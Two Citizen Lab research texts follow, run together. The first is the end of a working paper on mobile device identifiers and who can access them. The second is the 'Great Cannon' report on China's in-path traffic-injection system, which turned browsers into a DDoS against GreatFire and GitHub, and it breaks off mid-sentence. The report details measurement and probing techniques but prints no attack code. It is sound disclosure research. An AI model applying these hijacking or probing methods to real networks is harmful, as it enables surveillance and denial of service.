identifier.\n\n\nSIM\nThe Subscriber Identification Module identifies and authenticates the phone and user to the network, has a unique serial number, and holds substantial information about the user.\n\n\nIMSI\nThe International Mobile Subscriber Identification number uniquely identifies the user.\n\n\nDevice IP Address\nWith mobile data, devices are typically assigned a network IP address.\n\n\nMSISDN\nThe Mobile Subscriber Integrated Services Digital Network number includes the caller’s phone number, and uniquely identifies a particular subscriber’s SIM card.\n\n\n\nTable 2: Selected Communications Network Identifiers\nThe operators of communications networks, like mobile carriers (e.g., AT&T), or the operators of a Wi-Fi connection (e.g., coffee shops), can read a range of identifiers from devices.  In the case of carriers, they also assign their own identifiers.\nMobile Carriers\nMobile service operators typically assign identifiers that register subscribers to cellular networks. The Mobile Identification Number (MIN) or Mobile Subscription Identification Number (MSIN) are used to uniquely identify a subscriber. A Subscriber Identification Module (SIM), commonly referred to as a “SIM Card,” includes information about which carrier is associated with the module, its time of manufacture and other carrier-specific information, as well as a serial number uniquely linked with the SIM itself. The SIM is identified to the network with an International Mobile Subscriber Identity (IMSI) number2, which in turn identifies the mobile country code, network code, and mobile subscription identification number. In the case of cellular data, a network IP addresses is also assigned to the device.\nUsing identifiers like the IMSI, cellular operators typically collect geolocation records of mobile devices movements based on proximity to cellular towers.  They also collect billing and usage information (e.g., websites visited, numbers dialled out, numbers dialled in, messages sent and received, etc.).\nWi-Fi Operators\nIn comparison to cellular providers, Wi-Fi operators tend to issue or require fewer identifiers. Wi-Fi operators will most commonly assign IP address information, though they may also require authentication credentials in order to log into the Wi-Fi hotspot.  However, it is difficult to generalize about the practices of Wi-Fi operators, as they have widely varying policies about collecting and retaining data transmitted by users’ devices.\nImportantly, communications network providers (both mobile and Wi-Fi) are often able to read, retain/log, or make decisions based on the identifiers and data that are transmitted on their networks. For example, a communications provider can watch for the identifiers linked to a physical device as well as the identifiers associated with operating systems and applications. After reading the identifiers, they can log the presence of the identifiers for billing or marketing purposes, as well as make decisions whether or not to provide the device with service.\nOperating System\n\n\n\nAcronym\nWhat it does\n\n\nIFA\nApple’s Identifier For Advertisers lets app developers track users and replaces the UDID (Unique Device Identifier)3\n\n\nAndroid Identifier\nA unique number generated when the operating system is first run that can be used to track users.\n\n\nGoogle Wallet & Apple Pay\nPayment services linked to both devices and accounts.\n\n\n\nTable 3: Selected Operating System Identifiers\nMobile operating system developers, such as Google, Apple, Microsoft, and Blackberry, can also include identifiers that assist users in operating their devices and provide resources to developers responsible for creating applications for the respective manufacturers’ operating systems.\nAndroid devices, for example, have the Android Identifier that is generated the first time a newly installed Android OS is booted.4 Previously, Apple devices both used and shared a UDID (Unique Device Identifier) with applications. After privacy and security concerns were raised by researchers and the press, Apple introduced a separate number in more recent versions of iOS that is called the Identifier for Advertisers (IFA). The IFA (which can be disabled by a device owner) lets advertisers track user behavior across activities.\nSometimes operating systems providers will prompt users to generate new identifiers or credentials, such as a new Google account, Microsoft Live account, or AppleID. A growing number of companies, including Google (Google Wallet) and Apple (Apple Pay) are also integrating mobile payment services with near field communication options built into devices.  In addition, mobile carriers sometimes integrate these payment options with mobile app stores, like Google Play or the App Store. Users may also be asked to provide ‘crash’ information to the operating system manufacturer, and such information may contain details about the user’s device and their usage of it.\nApplication Layer\nFinally, application makers develop identifiers for authentication and advertising purposes. They may require users to create or sign in using authentication credentials or, when paying for items, either pay through operating system-based payment systems or through their own independent payment gateways. Applications may also ‘leak’ identifying information about the application itself, such as declaring their name, version information, or communications protocol in the user-agent identification string.5\nApplications may also request access to sensor (e.g. accelerometer) or communications data, such as GPS, Wi-Fi, or SMS information. Applications can also request user data, such as contacts and files. Still other applications request a wide range of information from user devices, not all of it clearly aligned with the advertised functionality of the app. Even if the application itself is only using the “necessary” permissions for functionality, advertising networks included in the application may be “piggy backing” on the permissions requested by the app in order to access identifying data.\nAccess to these pieces of data is typically referred to as ‘permissions’; only once a user or device owner has permitted the application to read this information does it gain access to the requested sensor, user, or communications data.\nSurveys of mobile device applications have shown that applications request access to more information than they require to perform their stated functions (e.g., a calculator application requesting access to geolocation, SMS, and call log information). Such overbroad requests for data on mobile devices create privacy problems, including: the user may not know that personal data is shared; the app developer may share data with third parties; the data may not be transmitted securely; and, the data may not be stored securely.\nWho can access what on a mobile device?\nThe range of identifiers discussed previously are not accessible to all of the different parties involved in facilitating and enabling mobile device-based communications. Table 4 provides a general summary of the kinds of data available to each party. However, given the complexity of the ecosystem it is difficult to generalize, and there is likely to be variation in specific cases.\n\n\n\nIdentifier\nCellular Provider\nWi-Fi Provider\nOS Vendor\nApplication Developer6\n\n\nMAC Address\nX\nX\nX\nX\n\n\nIMEI\nX\n\nX\nX\n\n\nSIM\nX\n\nX\nX\n\n\nIMSI\nX\n\nX\nX\n\n\nIP Address\nX\nX\nX\nX\n\n\nPhone Number\nX\n\nX\nX\n\n\nESN\nX\n\nX\nX\n\n\nGPS\n*7\n\nX\nX\n\n\nWi-Fi\n\nX\nX\nX\n\n\nBluetooth ID\n\n\nX\nX\n\n\nLogin/Payment Credentials\n*8\nX\nX\nX\n\n\n\nTable 4: Mobile Identifiers and who has access to them\nCellular Provider\nCellular providers typically possess a wide range of information about you; in addition to the identifiers, denoted in Table 4, they may have payment information for post-billing purposes, government identification information when that kind of information must be provided to receive a SIM card, credit information, and more. These additional kinds of information may be needed to satisfy business or regulatory requirements.\nWi-Fi Provider\nThe provider of the Wi-Fi network to which a device is connected can capture and read unencrypted data traffic, such as unencrypted web traffic. This type of provider can also determine information about a device connected to the network by analyzing transmitted user-agent strings, the device’s MAC address, or any identifiers that application or mobile operating system developers transmit in plaintext.\nOS Vendor\nThe developers of major operating systems, like Android, have access to a wide range of information about the device. For an Android device to regularly receive updates it must be tied to an account, such as the Gmail account required to access the Google Play Store. In addition to the exceptionally wide range of information about the device that this access provides, many of the bundled applications on phones, including maps, provide a rich stream of location information back to the operating system manufacturer.\nThe design principles integrated within mobile operating systems vary considerably, with consequences for how much of a user’s communications the vendor sees. For example, on Android, Google Hangout messages are accessible to Google in an unencrypted format, whereas iMessage communications on iOS are encrypted end-to-end, blocking Apple from easily reading the messages. Despite these differences, vendors still receive substantial information about users via avenues like mobile account backup and recovery, updates, map applications, and activities on app stores.\nFinally, while tremendous variation exists across handset manufacturers, major manufacturers also have avenues for access to identifying information about users. For example, some major manufacturers offer ‘find my mobile,’ backup services, and updates. Some previous reports have highlighted privacy and security concerns with these services, including cases where personal user data was apparently sent without encryption.\nApplication Developer\nApplication developers can access a range of identifiers in the course of providing their services. Many mobile operating systems will reveal which identifiers an application seeks to access, such as phone dialing information, SMS messages, or the device’s GPS; these possible permissions are noted in Table 4. In addition, developers may partner with advertising networks or other third parties, and share their users’ identifiers or personal information with these other parties. As a result, in addition to the apparent collectors of identifiers (i.e. app developers) there are largely hidden collectors, such as those belonging to advertisers and analytics or crash report companies.\nDevice Tracking by Third Parties Using Identifiers \nThe many identifiers assigned to our devices form a key part of the operations of mobile and wireless networks. However, a range of vulnerabilities can be exploited by another category of actors: third parties who seek to track or monitor the communications of device owners.\nFor example, security flaws in the design of the global telephone system enable third parties to silently track the location of any mobile number anywhere in the world, as well as snoop on user activities. At a more local level, businesses are increasingly monitoring the movement of shoppers and foot traffic near and within their stores; some companies use the Wi-Fi MAC address, signal strength, and other mobile device characteristics to identify customers as they browse stores or walk in retail areas. Some attempts have been made by manufacturers to reduce the identifying characteristics of Wi-Fi connectivity by randomizing MAC addresses, but with mixed results.\nData Gathering and Surveillance by State Actors\nGovernments throughout the world make extensive use of the vulnerabilities and privacy deficits associated with mobile communications to conduct both targeted and widespread surveillance.\nWe know from a recent case in Libya that the Gaddafi regime leveraged tracking and monitoring on the mobile network as a potent tool for control and repression. Moreover, state-level actors have also hacked SIM card manufacturers’ systems to collect encryption keys, and can collect IMSI and IMEI numbers alongside phone call information. At local levels, some authorities use ‘IMSI-catchers’ to create fake cellular towers for targeted monitoring. As nearby cellular phones connect to these fake towers, users can be identified and their calls and messages monitored.\nThe applications running on mobile devices are also targeted by state actors. The Canadian Communications Security Establishment intelligence agency reportedly experimented with capturing data that leaked from mobile devices to map and track those devices (and their owners) as they moved around the country.  British intelligence officers exploited a popular web browsing application that poorly secured users’ information. Finally, British and American intelligence officers reportedly captured information, such as contact books, that were collected by the application ‘Angry Birds.’\nConcluding Remarks\nThe mobile ecosystem is complex and multi-faceted, making it challenging for ordinary users to evaluate their security and privacy risks. Even security conscious users find it difficult to control the communications from their devices. This working document is intended to highlight only one part part of this environment: the many unique identifiers that are regularly transmitted from our devices. We welcome feedback and input, and hope to update the working document in the future.\n\nFootnotes\n1 On CDMA networks, devices may use an ESN (Electronic Serial Number) or an MEID (Mobile Equipment Identifier) for the same purposes\n2 To limit transmission of the more sensitive IMSI number, the network uses a temporary number (the Temporary Mobile Subscriber Identity) for most periodic updates.\n3 Apple still has access to the UDID; the IFA was developed to reduce Apps access to the UDID while providing tracking information to advertisers.\n4 A factory reset results in a new Android Identifier.\n5 When a user visits a website, the user’s browser sends a string of text (the ‘user agent identification string’) to the requested web server identifying the user’s web browser, browser version number, operating system and other details about the user’s system.\n6 Depending on the OS, apps would typically need to request permissions for this access.\n7 In jurisdictions where enhanced emergency calling is being rolled out some providers may be able to access your device GPS output when you make an emergency call.\n8 In some cases carriers provide mobile payment options, e.g. Google Play, for online services.\n\n\t\t\t\t\n\t\t\t",

The first known usage of the Great Cannon is in the recent large-scale novel DDoS attack on both GitHub and servers used by GreatFire.org.\nAuthors: Bill Marczak1,2,3 (Lead), Nicholas Weaver2,3 (Lead), Jakub Dalek,1 Roya Ensafi,4 David Fifield,2 Sarah McKune,1 Arn Rey, John Scott-Railton,1 Ronald Deibert,1 Vern Paxson.2,3\nAffiliations: (1) Citizen Lab, Munk School of Global Affairs, University of Toronto; (2) International Computer Science Institute; (3) University of California, Berkeley; (4) Princeton University\nDownload PDF version\nSection 1: Introduction, Key Findings\nOn March 16, GreatFire.org observed that servers they had rented to make blocked websites accessible in China were being targeted by a Distributed Denial of Service (DDoS) attack.  On March 26, two GitHub pages run by GreatFire.org also came under the same type of attack.  Both attacks appear targeted at services designed to circumvent Chinese censorship.  A report released by GreatFire.org fingered malicious Javascript returned by Baidu servers as the source of the attack.1  Baidu denied that their servers were compromised.2\nSeveral previous technical reports3 have suggested that the Great Firewall of China orchestrated these attacks by injecting malicious Javascript into Baidu connections.  This post describes our analysis of the attack, which we were able to observe until April 8, 2015.\nWe show that, while the attack infrastructure is co-located with the Great Firewall, the attack was carried out by a separate offensive system, with different capabilities and design, that we term the “Great Cannon.”  The Great Cannon is not simply an extension of the Great Firewall, but a distinct attack tool that hijacks traffic to (or presumably from) individual IP addresses, and can arbitrarily replace unencrypted content as a man-in-the-middle.\nThe operational deployment of the Great Cannon represents a significant escalation in state-level information control: the normalization of widespread use of an attack tool to enforce censorship by weaponizing users. Specifically, the Cannon manipulates the traffic of “bystander” systems outside China, silently programming their browsers to create a massive DDoS attack.  While employed for a highly visible attack in this case, the Great Cannon clearly has the capability for use in a manner similar to the NSA’s QUANTUM system,4 affording China the opportunity to deliver exploits targeting any foreign computer that communicates with any China-based website not fully utilizing HTTPS.\n \nReport Structure\nWe organize our Report as follows:\nSection 2 locates and characterizes the Great Cannon as a separate system;\nSection 3 analyzes DDoS logs and characterizes the distribution of affected systems;\nSection 4 presents our attribution of the Great Cannon to the Government of China;\nSection 5 addresses the policy context and implications;\nSection 6 addresses the possibility of using the Great Cannon for targeted exploitation of individual users.\n \nSection 2: The Firewall & The Cannon: Separate Systems, Significant Similarities\nFigure 1. Simplified logical topology of the Great Cannon and Great Firewall\nIn general, a firewall serves as an in-path barrier between two networks: all traffic between the networks must flow through the firewall.  In contrast, an on-path system like the Chinese “Great Firewall” (GFW) sits off to the side: it eavesdrops on traffic between China and the rest of the world (TAP in Figure 1), and terminates requests for banned content (for example, upon seeing a request for “http://www.google.com/?falun”,5 regardless of actual destination server) by injecting a series of forged TCP Reset (RST) packets that tell both the requester and the destination to stop communicating (INJECT RST in Figure 1).6  On-path systems have architectural advantages for censorship, but are less flexible and stealthy than in-path systems as attack tools, because while they can inject additional packets, they cannot prevent in-flight packets (packets that have already been sent) from reaching their destination.7  Thus, one generally can identify the presence of an on-path system by observing anomalies resulting from the presence of both injected and legitimate traffic.8\nThe GFW keeps track of connections and reassembles the packets (“TCP bytestream reassembly”)  to determine if it should block traffic.  This reassembly process requires additional computational resources, as opposed to considering each packet in isolation, but allows better accuracy in blocking.  While a web request often fits within a single packet, web replies may be split across several packets, and the GFW needs to reassemble these packets to understand whether a web reply contains banned content.\nOn any given physical link (e.g., a fiber optic cable), the GFW runs its reassembly and censorship logic in multiple parallel processes9 (perhaps running on a cluster of many different computers).  Each process handles a subset of the link’s connections, with all packets on a connection going to the same process.  This load-balanced architecture reflects a common design decision when a physical link carries more traffic than a single computer can track.  Each GFW process also exhibits a highly distinctive side-channel — it maintains a counter, and numbers the forged TCP Reset packets it injects (via the value of the IP TTL field).\nThe Great Cannon (GC) differs from the GFW: as we will show, the GC is an in-path system, capable of not only injecting traffic but also directly suppressing traffic, acting as a full “man-in-the-middle” for targeted flows.  The GC does not actively examine all traffic on the link, but only intercepts traffic to (or presumably from) a set of targeted addresses.  It is plausible that this reduction of the full traffic stream to just a (likely small) set of addresses significantly aids with enabling the system to keep up with the very high volume of traffic: the GC’s full processing pipeline only has to operate on the much smaller stream of traffic to or from the targeted addresses.  In addition, in contrast to the GFW, the GC only examines individual packets in determining whether to take action, which avoids the computational costs of TCP bytestream reassembly.  The GC also maintains a flow cache of connections that it uses to ignore recent connections it has deemed no longer requiring examination.\nThe GC however also shares several features with the GFW.  Like the GFW, the GC is also a multi-process cluster, with different source IP addresses handled by distinct processes.  The packets injected by the GC also have the same peculiar TTL side-channel as those injected by the GFW, suggesting that both the GFW and the GC likely share some common code.  Taken together, this suggests that although the GC and GFW are independent systems with different functionality, there are significant structural relationships between the two.\nIn the attack on GitHub and GreatFire.org, the GC intercepted traffic sent to Baidu infrastructure servers that host commonly used analytics, social, or advertising scripts.  If the GC saw a request for certain Javascript files on one of these servers, it appeared to probabilistically take one of two actions: it either passed the request onto Baidu’s servers unmolested (roughly 98.25% of the time), or it dropped the request before it reached Baidu and instead sent a malicious script back to the requesting user (roughly 1.75% of the time).  In this case, the requesting user is an individual outside China browsing a website making use of a Baidu infrastructure server (e.g., a website with ads served by Baidu’s ad network).  The malicious script enlisted the requesting user as an unwitting participant in the DDoS attack against GreatFire.org and GitHub.\n \nLocalizing the Cannon\nThe GFW continues to operate as normal: on-path and statefully\nWe began our investigation by confirming the continued normal operation of the GFW’s censorship features.  We did so employing measurements between our test system outside of China and a Baidu server that we observed returning the malicious Javascript.  We sent the Baidu server a request that the GFW would process as a query for “http://www.google.com/?falun”, a URL long known10 to trigger the GFW to inject forged TCP Resets to terminate the connection.  This packet capture shows the results of our experiment, which confirmed that the normal, well-understood operation of the GFW continues.  Note that the capture includes both the injected TCP Reset and, later, the legitimate response (an HTTP 403 reply) from the Baidu server.  This occurs because the GFW operates as an on-path system, and, as discussed earlier, on-path systems cannot prevent in-flight packets from reaching their destination.\nFigure 2. How the Great Cannon was deployed in the GitHub and GreatFire.org attacks\n \nLocalizing the GFW\nWe then localized where (with respect to our measurement system) in the network topology the GFW operates, as follows.  For a given measurement packet, we can control how far into the network it transits from our measurement system to its destination by controlling the packet’s TTL value.  The TTL value determines after how many intermediate hops a packet will be discarded by the Internet’s internal routers.  We sent the “Falun” queries from our test system to the Baidu server with TTL values increasing from 1 on up.  We observed that the GFW’s TCP Reset injection only occurred when we sent packets with TTL values >= 18, suggesting that the GFW acts on traffic flowing between the 17th and 18th hop along the path from our test system to the Baidu server (which was itself 24 hops away from our test system).  This packet capture shows our localization results.11\n \nThe GC operates as a separate, in-path system\nAs noted previously, our traces of GFW operation showed both the injected TCP Reset, as well as the legitimate server reply.  In contrast, no legitimate server reply accompanied the injected malicious reply from the GC.  We ran further testing, where we retransmitted our request to Baidu over the same connection, and with the same sequence numbers, after we received a malicious response.  We observed Baidu responding as normal to the retransmitted request.  Thus, we conclude12 that the GC dropped our request before it reached Baidu, a capability not present in the GFW.13\nWe also checked whether the GFW and GC might share the same injector device,14 but found no evidence that they do.  In particular, from a given TCP source port, we sent one request designed to trigger GC injection, followed by a request designed to trigger GFW injection.  We repeated the experiment from a number of source ports.  While packets injected by both the GFW and GC exhibited a similar (peculiar) TTL side-channel indicative of shared code between the two systems, we found no apparent correlation between the GFW and GC TTL values themselves.\n \nThe GC appears to be co-located with the GFW\nWe used the same TTL technique to localize the GC on the path between our test system and the Baidu server.  We found that for our path, the GC acted on traffic between hop 17 and hop 18, the same link we observed as responsible for the GFW.  We also observed that unlike the GFW, we could trigger the GC using “naked” requests (i.e., requests sent in isolation, with no previous TCP SYN as required for standard communication).  Acting on “naked” requests implies that the GC’s content analysis is more primitive (and easily manipulated), but does offer significant performance advantages, as the GC no longer needs to maintain complex state concerning connection status and TCP bytestream reassembly.\nWe also checked two separate servers in China whose traffic the GC targets to observe whether the GC existed along with the Great Firewall on multiple network paths.  From our measurement system outside of China, we examined the path to both 115.239.210.141 and 123.125.65.120.  For 115.239.210.141, the GFW and the GC both exist between hop 12 and 13, on the link between 144.232.12.211 and 202.97.33.37, as the traffic enters China Telecom.  For 123.125.65.120, the GFW and GC both exist between hop 17 and 18, on the link between 219.158.101.61 and 219.158.101.49, belonging to China Unicom.  A previous report by Robert Graham used the same TTL technique to conclude that on one link, the GC was located “inside China Unicom infrastructure.”15\n \nThe GC is currently aimed only at specific destination IP addresses\nWhen we probed an IP address adjacent to the Baidu server (123.125.65.121), the GC ignored the requests completely, although the GFW acted on censorable requests to this host.\n \nUnlike the GFW, the GC only acts on the first data packet of a connection\nFor a given source IP address and port, the GC only examines the first data packet sent when deciding whether to inject a reply.  To avoid examining subsequent packets requires remembering which connections it has examined in a flow cache.  Unlike the GFW, the GC does not reassemble packets, a significant implementation difference.  In addition, the GC will process invalid HTTP requests, while the GFW will not, also indicating differing implementations.\nWe confirmed these behaviors by sending a number of probes to the Baidu server, requesting resources that trigger the GC’s injection.  Each probe had a different source port.  We sent 500 probes, each with the request split across three packets (so 1,500 packets total).  The GC ignored each probe.  We then sent 500 probes where the first packet’s data is an invalid HTTP request, and the second packet’s data is a complete, valid request for a targeted resource.  The GC ignored each probe.  We then sent a final 500 single-packet probes, each containing a complete, valid request for a targeted resource, to confirm normal GC operation.  As expected, the GC injected malicious content in some cases, seemingly based on its probabilistic decision-making process.\n \nHow big is the GC flow cache?\nWe attempted to completely fill the GC flow cache by sending packets to the Baidu server with different source IP addresses and ports, while probing to see whether the entries that we previously added had now expired.  Our attempt suggests that at least in some cases, the GC flow cache between our test system and the Baidu server supports up to around 16,000 entries for a single sending IP address.\n \nUnlike the GFW, the GC appears to act probabilistically\nCensorship systems generally operate in a deterministic fashion: they aim to block all content that matches the target criteria.  The GC, on the other hand — at least for this particular attack — appears to act probabilistically, and ignores most of the traffic it could act on.  In one test, it completely ignored all traffic from one of four measurement IP addresses, and on the three other measurement IP addresses it only responded to 526 requests out of an initial 30,000 from the three (1.75%).\nThe cache capacity test also provides evidence that the GC’s probabilistic choice occurs on the decision to act on a particular flow, and not as some sort of pre-filter for reducing analysis load.  When we succeeded in completely filling the flow cache, subsequently injected packets occurred for different source ports than in the initial test.  If the GC only intercepted a subset of flows to the target IP address, we would expect subsequent injections to appear for the same flows, since most schemes to probabilistically select flows for interception (such as hashing the connection 4-tuple) would select the same set of flows the second time around.\n \nDoes the GC have a load-balanced architecture?\nWe determined that the GC uses a separate flow cache for different source IP addresses, and that packets injected from different source IP addresses have distinct TTL side-channels.  This finding suggests a load-balanced architecture similar to the GFW, where packets are routed to GC nodes based on source IP address.  We then sent traffic alternating from four measurement IP addresses in an attempt to fill a 16,000 entry cache.  This attempt did not manage to fill the cache, suggesting that the GC not only processed the different source IP addresses with different injection elements, but did so using different flow caches.  As stated before, one of the four source IP addresses never received any injected replies.\n \nSection 3: Analysis of the DDoS Logs from the attack against GreatFire\nThe staff of GreatFire.org provided the authors with server logs covering the period of March 18 to 28.16  (A report previously published by Great Fire uses a different sample.17) This period appears to capture the end of the DDoS attack on GreatFire.org’s services, as shown by the size of server log files over this period:\nTo keep our analysis tractable, we examined a sample of the data from March 18th 11:00 GMT to March 19th 7:00 GMT, as seen from two of the three most commonly seen backend servers.  For each hour, we selected 30MB of compressed logs for each server.18  The total sample includes 16,611,840 web requests, with 13,183 unique source IP addresses.  We used the MaxMind GeoIP2 Lite database19 from March 3rd, 2015 to assign a country of origin to each source IP address.  For any IP address that did not result in a definite geolocation using this tool (31 addresses), we looked up the address manually using the iplocation.net service.\nThe figure below summarizes the top countries of origin, with China added for comparison.\nFigure 3. Number of Unique IP addresses seen in DDoS log sample showing the top 5 countries/regions, with Chinese traffic included for comparison.\nNote that 8,827 (66.9%) of the IP addresses originate from Taiwan and Hong Kong, two regions where Chinese is the official language. China, however, accounted for only 18 requests.  This is consistent with malicious code injected into China-hosted websites at the border of the Chinese Internet.\nTo determine which websites have their responses altered by the injection of malicious code, we extracted the domain names of the 25 most frequently seen referrers in our dataset,20  finding that these domains account for 55% of the total requests in the sample.\nFigure 4. Top 25 referrers found in the DDoS logs, grouped by domain. The top bar reflects domains directly in the baidu.com DNS space. Manual verification confirms that all top 25 referrers use Baidu services such as advertising or analytics.\nThe most commonly seen domain is pos.baidu.com (37.7% of total requests in the sample), a part of Baidu’s ad network.  Many non-Baidu sites display ads served through Baidu’s ad network, indicating that visitors to non-Baidu sites displaying ads also became targeted.21\nWe examined the top 25 domains, and linked each one to Baidu: in each case, the site is either a Baidu property or uses Baidu analytics, advertisements, or static resources.22 This finding indicates that Baidu was a major injection target for this attack. According to Alexa statistics, Baidu itself is the fourth-most visited site globally, the highest ranking China-based site on the global list,23 and has received an estimated 4.99 million unique visitors from the US alone in the past 30 days.24\nWe speculate that Baidu was chosen as an injection target because it is a simple way to target many users.\n \nSection 4: Attributing the Great Cannon to the Chinese Government\nWe believe there is compelling evidence that the Chinese government operates the GC.  In recent public statements, China has deflected questions regarding whether they are behind the attack, instead emphasizing that China is often itself a victim of cyber attacks.25\n \nWhere is the GC Located?\nWe tested two international Internet links into China belonging to two different Chinese ISPs, and found that in both cases the GC was co-located with the GFW.  This co-location across different ISPs strongly suggests a governmental actor.\n \nWho built the Great Cannon?\nThat the GFW and GC have the same type of TTL side-channel suggests that they share some source code.  We are unaware of any public software library for crafting packets that introduces this type of TTL side-channel.\n \nWhat is the Great Cannon’s Function?\nOur observations indicate that the GC’s design does not reflect technology well-suited for performing traffic censorship.  Its operation only examines the first data packet of a given connection, which provides a weak censorship mechanism compared to the GFW.  More generally, the GC’s design does not, in practice, enable it to censor any traffic not already censorable by the GFW.  Thus, the evidence indicates that the GC’s role is to inject traffic under specific targeted circumstances, not to censor traffic.\n \nWho is the Great Cannon attacking?\nThe DDoS attack launched by the GC using “bystander” machines directly aligns with known political concerns of the Chinese government.  The Cyberspace Administration of China has previously referred to GreatFire as a “foreign anti-Chinese organization” (境外反华组).26  The particular GreatFire service targeted in this attack provides proxies to bypass the GFW using encrypted connections to Amazon’s CloudFront cloud service.\nGreatFire also hosts two GitHub repositories, https://gitub.com/greatfire and https://github.com/cn-nytimes, that provide technology for users who wish to circumvent Chinese government censorship.  The attack on GitHub specifically targeted these repositories, possibly in an attempt to compel GitHub to remove these resources.  GitHub encrypts all traffic using TLS, preventing a censor from only blocking access to specific GitHub pages.  In the past, China attempted to block Github, but the block was lifted within two days, following significant negative reaction from local programmers.27\n \nSection 5: Policy Context and Implications\nThis section describes some policy implications of deploying the Great Cannon, addresses the impact of targeting Baidu traffic specifically, and discusses the Chinese authorities that may be involved in operation of the GC.\n \nImplications of the GC for Chinese Policy\nDeploying the Great Cannon is a major shift in tactics, and has a highly visible impact. It is likely that this attack, with its potential for political backlash,28 would require the approval of high-level authorities within the Chinese government. These authorities may include the State Internet Information Office (SIIO),29 which is responsible for Internet censorship. It is also possible that the top body for cybersecurity coordination in China, the Cybersecurity and Informatization Leading Group (CILG),30 would have been involved. The CILG is chaired by Xi Jinping and includes as members senior leaders from across the government; its administrative office is housed within the SIIO.31\nThe government’s reasoning for deploying the GC here is unclear, but it may wish to confront the threat presented to the Communist Party of China’s (CPC) ideological control by the “collateral freedom” strategy advanced by GreatFire.org32 and others. The attack was exceptionally costly to GreatFire, according to their public statements,33 as well as disruptive to the companies that hosted GreatFire content. Such a disruption could be both an attempt to block the operations of an undesirable resource, and a signal sent to other organizations of the potential price tag for this kind of activity. Deployment of the GC may also reflect a desire to counter what the Chinese government perceives as US hegemony in cyberspace.\nThis approach would be consistent with the CPC’s paramount focus on protecting “domestic stability” (and its own authority) against entities it has identified as “foreign hostile forces,” including not only governments but also Western media outlets (such as the New York Times) and NGOs or other civil society actors (such as GreatFire.org).34 According to such a world view, the collateral freedom strategy is a provocative, hostile act that threatens China’s security.\n \nImplications of Using Traffic to Baidu Services\nThe incorporation of Baidu in this attack suggests that the Chinese authorities are willing to pursue domestic stability and security aims at the expense of other goals, including fostering economic growth in the tech sector. Selecting Baidu’s international traffic may appear counterproductive given the importance of Baidu to the Chinese economy: the company enjoys stature as one of China’s “big three” Internet firms, alongside Alibaba and Tencent,35 and currently ranks as the top site in China.36 While its shares came under pressure after the February release of its Q4 and fiscal year 2014 reports,37 its total revenue in 2014 was USD $7.906 billion, with online marketing revenues for that period valued at USD $7.816 billion.38\n“Service interruptions could reduce our revenues and profits and damage our brand if our systems are perceived to be unreliable.”39\nBaidu has denied involvement in the attack and asserted its internal security was not compromised.40 Yet the targeting of international visitors trying to reach sites that are Baidu properties, or that use Baidu analytics, advertisements, or static resources, could undermine the company’s reputation and its appeal to overseas users and advertisers.\nBaidu writes in its SEC filings that it was the target of legal action in the United States in 201141 for complying with Chinese censorship. Baidu explicitly notes that cooperation and coordination with Chinese censorship authorities could be costly in terms of brand image, profit, and stockholder confidence.\n“our compliance with PRC regulations governing internet access and distribution of news and other information over the internet may subject us to negative publicity or even legal actions outside of China.”42\nMoreover, exploiting Baidu’s international reach as a means for conducting digital attacks belies the government’s recent commitment to enhance the global presence of Internet companies. At the meeting of the National People’s Congress on March 5, 2015, Premier Li Keqiang (who is also Vice-Chair of the CILG) announced:\nWe will develop the “Internet Plus” action plan to integrate the mobile Internet, cloud computing, big data, and the Internet of Things with modern manufacturing, to encourage the healthy development of e-commerce, industrial networks, and Internet banking, and to guide Internet-based companies to increase their presence in the international market.43\nThis goal – which closely echoes that contained in a draft declaration presented (but not passed) at the November 2014 Wuzhen World Internet Conference44 – may not come to fruition if Chinese domestic companies appear unreliable, their business objectives secondary to other objectives of the Chinese Government.\nChinese authorities may, however, be betting that their use of Baidu traffic to mount this DDoS attack will ultimately be perceived as an isolated occurrence, a sort of “force majeure,” with limited impact on Baidu’s long-term economic prospects – particularly given Baidu’s apparent status as unwitting victim and its strong market position.\nAdditionally, Baidu’s CEO Robin Li is a member of the Chinese People’s Political Consultative Conference45 and well-positioned for lucrative government contracts going forward — such as his artificial intelligence project “China Brain,” for which he has sought military support.46 He may have little personal incentive (let alone opportunity, given the existing legal and regulatory framework applicable to Internet companies in China47) to challenge this action by the government.\n \nThinking About Authorities Who May Be Responsible for Implementing The Great Cannon\nEven for the GFW, it is difficult to pinpoint the precise authorities behind its deployment, or its operators and origins. This makes understanding the origins of the GC equally challenging.  However, some clues are available. For example, the shared source code and co-location between the GFW and GC suggest that the GC could have been developed within the same institutional framework as the GFW. We might therefore draw further insight into the GC by assessing what we know about the GFW.\nSome reports characterize the GFW as an element of China’s “Golden Shield” project,48 under the authority of the Ministry of Public Security. However, unverified insider information ‘leaked’ online suggests that the GFW was developed within a separate entity: the “National Computer Network and Information Security Management Center” (国家计算机网络与信息安全管理中心) (hereafter, “the Center”).49 Little is publicly known about the Center. It appears to bear close relationship50 to the National Computer Network Emergency Response Technical Team/Coordination Center of China (CNCERT/CC) run by the Ministry of Industry and Information Technology (MIIT) — indeed, the listed address for CNCERT/CC is the same as that of the Center as indicated on its patent applications — and the former National Network and Information Security Coordination Team,51 a subcommittee of the State Informatization Leading Group subsumed by the CILG in 2014.52 Notably, “MIIT also regulates China’s six Internet service providers (ISPs), which in turn are expected to monitor and filter content on their networks according to censorship guidelines established by the State Council Information Office and the SIIO.”53 Those ISPs include China Telecom and China Unicom, on the links of which we co-located the GFW and GC (see above).\nIt is unknown whether the GFW and/or the GC are in fact maintained (or may have been developed in whole or in part) by the National Computer Network and Information Security Management Center.  However, patent applications filed by this entity, taken together, appear to indicate a mandate for large scale network surveillance, filtering, and defense. The Center has filed nearly 100 patent applications,54 for designs such as “Method for detecting unexpected hot topics in Chinese microblogs;” “Method and system for recognizing Tibetan dialects;” “Website classifying method;” “Method and system for intelligent monitoring and analyzing under cloud computing;” “Method and device for managing global indexes of mass structured log data;” “Method, device and system for traffic monitoring and switching;” “Image searching/matching method and system for the same;” and “Internet basic information management system” (this last “comprises a national-level management sub-system, a provincial management sub-system and an enterprise management sub-system” that “can perform effective supervision on the Internet basic information throughout the country”). Moreover, according to state media, during the time of the GFW’s development the so-called “father of the Great Firewall,” Fang Binxing, was employed at CNCERT/CC,55 an entity that appears closely tied to the Center.56 Fang is likewise listed as an inventor on a 2008 patent application by the Center, indicating some collaboration with the Center prior to that point.\nWhile we cannot determine the exact role played by the Center, the patent documentation and the Center itself require further research and analysis to determine whether they are relevant to operation of the GC, or present other human rights-related concerns.\n \nSection 6: Concluding Remarks: The Capability for Targeted Exploitation by China\nWe conclude with some remarks about the precedent set by China in the use of the GC and outline further implications for targeted exploitation. \nThe attack launched by the Great Cannon appears relatively obvious and coarse: a denial-of-service attack on services objectionable to the Chinese government.  Yet the attack itself indicates a far more 